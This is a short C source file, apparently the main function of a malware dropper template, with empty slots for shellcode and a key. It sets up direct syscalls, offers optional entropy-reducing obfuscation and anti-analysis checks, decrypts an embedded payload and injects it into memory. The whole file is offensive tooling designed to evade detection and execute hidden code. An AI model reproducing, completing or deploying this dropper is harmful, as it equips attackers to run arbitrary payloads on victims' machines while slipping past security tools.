#include "dropper.h"
#include "common.h"


/* SHELLCODE */

/* KEY */


int main() {

    DebugPrint("Debug mode enabled.\n");
    DebugPrint("Dropper started...\n");

    InitializeSyscalls();

    #ifdef ENTROPY_REDUCTION_ENABLED
        init_obfuscation();
    #endif

    #ifdef ANTI_ANALYSIS_ENABLED
        AntiAnalysis(30000); // 30 seconds timeout
    #endif

    BOOL bSuccess;

    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key));
    if (!bSuccess) {
        DebugPrint("[X] Failed to decrypt payload.\n");
       return 1;
    }

    bSuccess = inject_payload(Payload, sizeof(Payload));

    if (bSuccess) {
        DebugPrint("[i] Payload injected successfully.\n");
    } else {
        DebugPrint("[X] Failed to inject payload.\n");
    }

	DebugPrint("[#] Press <Enter> To Exit ... ");

    return 0;
}